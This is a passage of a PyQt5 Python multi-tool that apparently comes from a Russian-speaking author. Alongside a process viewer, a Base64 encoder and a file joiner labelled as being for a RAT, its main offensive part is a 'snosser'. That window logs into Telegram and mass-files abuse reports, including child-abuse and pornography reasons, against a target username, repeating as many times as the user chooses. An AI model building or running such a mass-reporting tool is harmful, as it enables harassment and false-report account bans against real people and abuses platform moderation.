        self.title_label.setFont(QFont("Arial", 18, QFont.Bold))
        self.title_label.setStyleSheet("color: white; font-size: 18px;")
        process_layout.addWidget(self.title_label)

        self.process_list = QListWidget(self)
        self.process_list.setStyleSheet(list_style)
        process_layout.addWidget(self.process_list)

        self.kill_button = QPushButton("Kill Selected Process")
        self.kill_button.setStyleSheet(button_style)
        self.kill_button.clicked.connect(self.kill_process)
        process_layout.addWidget(self.kill_button)

        process_tab.setLayout(process_layout)
        self.tabs.addTab(process_tab, "Processes")

        self.update_processes()

    def add_network_tab(self):
        network_tab = QWidget()
        network_layout = QVBoxLayout()

        self.network_label = QLabel("Network Status: Not Connected")
        self.network_label.setStyleSheet("font-size: 14px; color: white; margin: 10px;")
        network_layout.addWidget(self.network_label)

        network_tab.setLayout(network_layout)
        self.tabs.addTab(network_tab, "Network")

        self.update_network_info()

    def add_device_tab(self):
        device_tab = QWidget()
        device_layout = QVBoxLayout()

        self.device_label = QLabel("System Components:")
        self.device_label.setStyleSheet("font-size: 16px; color: lightcyan; margin: 10px;")
        device_layout.addWidget(self.device_label)

        self.device_list = QTextEdit(self)
        self.device_list.setStyleSheet(text_input_style)
        self.device_list.setReadOnly(True)
        device_layout.addWidget(self.device_list)

        self.cpu_usage_label = QLabel("CPU Usage: 0%")
        self.memory_usage_label = QLabel("Memory Usage: 0%")
        self.cpu_usage_label.setStyleSheet("font-size: 14px; color: lightgreen; margin: 10px;")
        self.memory_usage_label.setStyleSheet("font-size: 14px; color: lightblue; margin: 10px;")
        device_layout.addWidget(self.cpu_usage_label)
        device_layout.addWidget(self.memory_usage_label)

        device_tab.setLayout(device_layout)
        self.tabs.addTab(device_tab, "Devices")

        self.update_device_info()

    def update_processes(self):
        self.process_list.clear()

        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                memory_mb = proc.info['memory_info'].rss / (1024 * 1024)
                process_info = f"PID: {proc.info['pid']} | {proc.info['name']} | CPU: {proc.info['cpu_percent']}% | Memory: {memory_mb:.2f} MB"
                self.process_list.addItem(process_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        self.process_list.setStyleSheet("font-size: 12px;")

    def update_network_info(self):
        try:
            network_info = psutil.net_if_addrs()
            if not network_info:
                self.network_label.setText("No network interfaces found.")
                return

            network_status = "Not Connected"
            for interface, addrs in network_info.items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        network_status = f"IP: {addr.address} ({interface})"
                        break

            self.network_label.setText(f"Network Status: {network_status}")
        except Exception as e:
            self.network_label.setText(f"Error retrieving network information: {str(e)}")

    def update_device_info(self):
        device_info = ""

        device_info += f"CPU Cores: {psutil.cpu_count(logical=True)}\n"
        device_info += f"CPU Usage: {psutil.cpu_percent()}%\n"

        device_info += f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB\n"
        device_info += f"Used Memory: {psutil.virtual_memory().used / (1024 ** 3):.2f} GB\n"
        device_info += f"Memory Usage: {psutil.virtual_memory().percent}%\n"

        try:
            import subprocess
            result = subprocess.run(["wmic", "path", "win32_videocontroller", "get", "name"], capture_output=True, text=True)
            if result.returncode == 0:
                video_info = result.stdout.strip().split("\n")
                if len(video_info) > 1:
                    device_info += f"\nVideo Card: {video_info[1]}\n"
        except Exception as e:
            device_info += "\nNo video card information available.\n"

        try:
            temp_info = psutil.sensors_temperatures()
            if "coretemp" in temp_info:
                device_info += f"CPU Temperature: {temp_info['coretemp'][0].current} °C\n"
        except Exception as e:
            pass

        partitions = psutil.disk_partitions()
        for partition in partitions:
            device_info += f"\nDДиск: {partition.device}\n"
            device_info += f"  Mountpoint: {partition.mountpoint}\n"
            device_info += f"  Filesystem Type: {partition.fstype}\n"

        self.device_list.setPlainText(device_info)

    def update_cpu_memory_usage(self):
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        self.cpu_usage_label.setText(f"Использование ЦП: {cpu_usage}%")
        self.memory_usage_label.setText(f"Использование ОЗУ: {memory_usage}%")

    def kill_process(self):
        selected_item = self.process_list.currentItem()
        if selected_item:
            pid = int(selected_item.text().split(" | ")[0].split(":")[1].strip())
            try:
                psutil.Process(pid).terminate()
                self.update_processes()
            except Exception as e:
                print(f"Error terminating process {pid}: {e}")


class FileEncoder(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("File to Base64 Encoder and Decoder by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet(background)

        layout = QVBoxLayout()

        title_label = QLabel("Base 64 Encoder and Decoder")
        title_label.setFont(QFont("Arial", 14, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)

        self.file_path_input = QTextEdit()
        self.file_path_input.setPlaceholderText("Выберите файлы для кодирования или декодирования")
        self.file_path_input.setStyleSheet(text_input_style)
        self.file_path_input.setFixedHeight(60)
        layout.addWidget(self.file_path_input)

        browse_button = QPushButton("Обзор")
        browse_button.setStyleSheet(button_style)
        browse_button.clicked.connect(self.browse_files)
        layout.addWidget(browse_button)

        encode_button = QPushButton("Кодировать в Base64")
        encode_button.setStyleSheet(button_style)
        encode_button.clicked.connect(self.encode_files)
        layout.addWidget(encode_button)

        decode_button = QPushButton("Декодировать из Base64")
        decode_button.setStyleSheet(button_style)
        decode_button.clicked.connect(self.decode_files)
        layout.addWidget(decode_button)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(output_style)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

    def browse_files(self):
        options = QFileDialog.Options()
        file_paths, _ = QFileDialog.getOpenFileNames(self, "Выберите файлы", "", "Все файлы (*)", options=options)
        if file_paths:
            self.file_path_input.setText("\n".join(file_paths))

    def encode_files(self):
        file_paths = self.file_path_input.toPlainText().strip().split("\n")

        if not file_paths or not all(os.path.exists(path) for path in file_paths):
            QMessageBox.critical(self, "Ошибка", "Один или несколько файлов не найдены.")
            return

        for file_path in file_paths:
            if not file_path.strip():
                continue
            try:
                self.log_output.append(f"Начинается кодирование файла: {file_path}")

                with open(file_path, 'rb') as file:
                    file_data = file.read()
                    encoded_data = base64.b64encode(file_data).decode('utf-8')

                base64_file_path = file_path + ".b64"
                with open(base64_file_path, 'w', encoding='utf-8') as encoded_file:
                    encoded_file.write(encoded_data)

                self.log_output.append(f"Файл успешно закодирован: {base64_file_path}")
            except Exception as e:
                self.log_output.append(f"Ошибка при кодировании файла {file_path}: {str(e)}")

        QMessageBox.information(self, "Успех", "Кодирование файлов завершено.")

    def decode_files(self):
        file_paths = self.file_path_input.toPlainText().strip().split("\n")

        if not file_paths or not all(os.path.exists(path) for path in file_paths):
            QMessageBox.critical(self, "Ошибка", "Один или несколько файлов не найдены.")
            return

        for file_path in file_paths:
            if not file_path.strip():
                continue
            try:
                self.log_output.append(f"Начинается декодирование файла: {file_path}")

                with open(file_path, 'r', encoding='utf-8') as file:
                    encoded_data = file.read()
                    decoded_data = base64.b64decode(encoded_data)

                decoded_file_path = file_path.replace(".b64", "_decoded")
                with open(decoded_file_path, 'wb') as decoded_file:
                    decoded_file.write(decoded_data)

                self.log_output.append(f"Файл успешно декодирован: {decoded_file_path}")
            except Exception as e:
                self.log_output.append(f"Ошибка при декодировании файла {file_path}: {str(e)}")

        QMessageBox.information(self, "Успех", "Декодирование файлов завершено.")

class Snossers(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Endscape GUI for snossers")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(50, 50, 480, 620)

        self.setStyleSheet(background_index)

        self.child_windows = []

        self.buttons = []
        self.info_buttons = []

        self.min_width = 300
        self.min_height = 620
        self.setMinimumSize(self.min_width, self.min_height)

        self.button_width = 320
        self.button_height = 50
        self.info_button_width = 50
        self.button_spacing = 80
        self.column_spacing = 20

        self.buttons_data = [
            ("Snoser 1 (mb not working)", self.open_snos1_window,
             "Требует API, хз первый мой GUI для сносера (сносер вроде от @Esfelurm)")
        ]

        self.create_buttons()

    def create_buttons(self):
        for name, func, info in self.buttons_data:
            # Кнопка режима
            button = QtWidgets.QPushButton(name, self)
            button.clicked.connect(func)
            button.setStyleSheet(button_style)

            # Анимация наведения
            button.setGraphicsEffect(QtWidgets.QGraphicsDropShadowEffect(
                blurRadius=10, color=QtGui.QColor(0, 0, 0, 150), offset=QtCore.QPoint(0, 0)))

            button.enterEvent = lambda event, btn=button: self.animate_button(btn, True)
            button.leaveEvent = lambda event, btn=button: self.animate_button(btn, False)
            self.buttons.append(button)

            # Кнопка справки
            info_button = QtWidgets.QPushButton("?", self)
            info_button.clicked.connect(lambda _, text=info: self.show_info(text))
            info_button.setStyleSheet(info_button_style)
            self.info_buttons.append(info_button)

        # Расположить кнопки
        self.arrange_buttons()

    def animate_button(self, button, hover):
        animation = QtCore.QPropertyAnimation(button, b"geometry")
        animation.setDuration(200)

        rect = button.geometry()
        if hover:
            rect.setWidth(rect.width() + 10)
            rect.setHeight(rect.height() + 5)
        else:
            rect.setWidth(self.button_width)
            rect.setHeight(self.button_height)

        animation.setEndValue(rect)
        animation.start()

    def arrange_buttons(self):
        available_width = self.width()
        total_button_width = (
                self.button_width + self.info_button_width + self.column_spacing
        )
        max_buttons_per_column = self.height() // self.button_spacing

        columns = max(1, available_width // total_button_width)

        for index, (button, info_button) in enumerate(zip(self.buttons, self.info_buttons)):
            column = index // max_buttons_per_column
            row = index % max_buttons_per_column

            x_main_button = 50 + column * total_button_width
            y_position = 50 + row * self.button_spacing

            button.setGeometry(
                x_main_button, y_position, self.button_width, self.button_height
            )

            info_button.setGeometry(
                x_main_button + self.button_width + 10,
                y_position,
                self.info_button_width,
                self.button_height,
            )

    def resizeEvent(self, event):
        self.arrange_buttons()
        super().resizeEvent(event)

    def closeEvent(self, event):
        for window in self.child_windows:
            if window.isVisible():
                window.close()
        super().closeEvent(event)

    def show_info(self, info):
        msg = QtWidgets.QMessageBox(self)
        msg.setWindowTitle("Info")
        msg.setStyleSheet(help_window_style)
        msg.setText(info)
        msg.exec_()

    def open_child_window(self, window_class):
        for window in self.child_windows:
            if isinstance(window, window_class):
                window.close()

        window = window_class()
        self.child_windows.append(window)
        window.show()

    def open_snos1_window(self):
        self.open_child_window(Snosser_1)


class Program_Logic_1:
    def __init__(self, api_id, api_hash, phone_number, password, method, scammer_id, number):
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone_number
        self.password = password
        self.method = method
        self.scammer_id = scammer_id
        self.number = number

    def report_spam(self):
        with TelegramClient('reporter', self.api_id, self.api_hash) as client:
            client.start(self.phone_number, self.password)

            try:
                user = client.get_entity(self.scammer_id)
                scammer_input_peer = types.InputPeerUser(user_id=user.id, access_hash=user.access_hash)
            except ValueError:
                return False, 'No such person was found'

            reasons = {
                "1": types.InputReportReasonSpam(),
                "2": types.InputReportReasonPornography(),
                "3": types.InputReportReasonViolence(),
                "4": types.InputReportReasonChildAbuse(),
                "5": types.InputReportReasonOther(),
                "6": types.InputReportReasonCopyright(),
                "7": types.InputReportReasonFake(),
                "8": types.InputReportReasonGeoIrrelevant(),
                "9": types.InputReportReasonIllegalDrugs(),
                "10": types.InputReportReasonPersonalDetails()
            }

            reason = reasons.get(self.method)
            if not reason:
                return False, 'Invalid method selected'

            for i in range(int(self.number)):
                client(functions.account.ReportPeerRequest(
                    peer=scammer_input_peer,
                    reason=reason,
                    message=''
                ))
                time.sleep(0.5)  # To avoid rate limits

            return True, 'Reports sent successfully'

class Snosser_1(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Telegram Snosser GUI by Endscape 1 (NOT WORKING)')
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet(background)

        layout = QVBoxLayout()

        self.api_id_input = QLineEdit(self)
        self.api_id_input.setPlaceholderText('Enter API ID')
        self.api_id_input.setStyleSheet(text_input_style)
        layout.addWidget(self.api_id_input)

        self.api_hash_input = QLineEdit(self)
        self.api_hash_input.setPlaceholderText('Enter API Hash')
        self.api_hash_input.setStyleSheet(text_input_style)
        layout.addWidget(self.api_hash_input)

        self.phone_number_input = QLineEdit(self)
        self.phone_number_input.setPlaceholderText('Enter Phone Number')
        self.phone_number_input.setStyleSheet(text_input_style)
        layout.addWidget(self.phone_number_input)

        self.password_input = QLineEdit(self)
        self.password_input.setStyleSheet(text_input_style)
        self.password_input.setPlaceholderText('Enter Password (optional)')
        layout.addWidget(self.password_input)

        self.method_combo = QComboBox(self)
        self.method_combo.addItems([
            "1 - Report Spam",
            "2 - Report Pornography",
            "3 - Report Violence",
            "4 - Report Child Abuse",
            "5 - Report Other",
            "6 - Report Copyright",
            "7 - Report Fake",
            "8 - Report Geo Irrelevant",
            "9 - Report Illegal Drugs",
            "10 - Report Personal Details"
        ])
        self.method_combo.setStyleSheet(selector_style)
        layout.addWidget(self.method_combo)

        self.scammer_id_input = QLineEdit(self)
        self.scammer_id_input.setPlaceholderText('Enter Target Username')
        self.scammer_id_input.setStyleSheet(text_input_style)
        layout.addWidget(self.scammer_id_input)

        self.number_input = QLineEdit(self)
        self.number_input.setPlaceholderText('Введи количество репортов')
        self.number_input.setStyleSheet(text_input_style)
        layout.addWidget(self.number_input)

        self.report_button = QPushButton('Send Reports', self)
        self.report_button.setStyleSheet(button_style)
        self.report_button.clicked.connect(self.on_report)
        layout.addWidget(self.report_button)

        self.setLayout(layout)

    def on_report(self):
        api_id = self.api_id_input.text()
        api_hash = self.api_hash_input.text()
        phone_number = self.phone_number_input.text()
        password = self.password_input.text()
        method = self.method_combo.currentText().split(' ')[0]
        scammer_id = self.scammer_id_input.text()
        number = self.number_input.text()

        if not all([api_id, api_hash, phone_number, scammer_id, number]):
            QMessageBox.warning(self, 'Error', 'All fields are required!')
            return

        reporter = Program_Logic_1(api_id, api_hash, phone_number, password, method, scammer_id, number)
        success, message = reporter.report_spam()

        if success:
            QMessageBox.information(self, 'Success', message)
        else:
            QMessageBox.critical(self, 'Error', message)


class FileJoinerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('File_Unsplitter for RAT by Endscape')
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet(background)

        self.layout = QVBoxLayout()

        self.select_button = QPushButton('Выбрать части архива', self)
        self.select_button.setStyleSheet(button_style)
        self.select_button.clicked.connect(self.select_parts)
        self.layout.addWidget(self.select_button)

        self.parts_label = QLabel('Части архива не выбраны..', self)
        self.layout.addWidget(self.parts_label)

        self.join_button = QPushButton('Объединить части в архив', self)
        self.join_button.setEnabled(False)
        self.join_button.setStyleSheet(button_style)
        self.join_button.clicked.connect(self.join_files)
        self.layout.addWidget(self.join_button)

        self.setLayout(self.layout)

    def select_parts(self):
        options = QFileDialog.Options()
        parts, _ = QFileDialog.getOpenFileNames(
            self, "Выберите части архива", "", "Все файлы (*);;Части архива (*.part*)", options=options
        )
        if parts:
            self.parts = sorted(parts, key=lambda x: int(x.split(".part")[-1]))
            self.parts_label.setText(f'Выбрано частей: {len(self.parts)}')
            self.join_button.setEnabled(True)

    def join_files(self):
        if not hasattr(self, 'parts') or len(self.parts) == 0:
            return

        output_file, _ = QFileDialog.getSaveFileName(self, "Сохранить объединённый архив", "", "Архивы (*.zip)")

        if output_file:
            if not output_file.endswith('.zip'):
                output_file += '.zip'

            try:
                with open(output_file, 'wb') as outfile:
                    for part in self.parts:
                        with open(part, 'rb') as infile:
                            outfile.write(infile.read())
                try:
                    with ZipFile(output_file, 'r') as zip_ref:
                        if zip_ref.testzip() is None:
                            self.parts_label.setText(f'Архив успешно объединён и сохранён как: {output_file}')
                        else:
                            self.parts_label.setText("Ошибка: Полученный архив повреждён.")
                except BadZipFile:
                    self.parts_label.setText("Ошибка: Итоговый файл не является корректным zip-архивом.")
            except Exception as e:
                self.parts_label.setText(f"Ошибка: {e}")


class More_Programs(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Скачать мои другие программы :3")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setFixedSize(400, 300)
        self.setStyleSheet(background)

        layout = QVBoxLayout()

        label = QLabel("Тут ты сможешь скачать последние версии моих программ)")
        label.setFont(QFont("Arial", 10))
        label.setWordWrap(True)
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)

        self.links = {
            "Заходи!": "https://bio.link/endscape",
        }

        for name, url in self.links.items():
            button = QPushButton(name)
            button.setFont(QFont("Arial", 10))
            button.setFixedSize(250, 60)
            button.setStyleSheet(button_style)
            button.clicked.connect(lambda _, url=url: self.open_link(url))
            layout.addWidget(button, alignment=Qt.AlignCenter)  

        self.setLayout(layout)

    def open_link(self, url):
        QDesktopServices.openUrl(QUrl(url))


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())
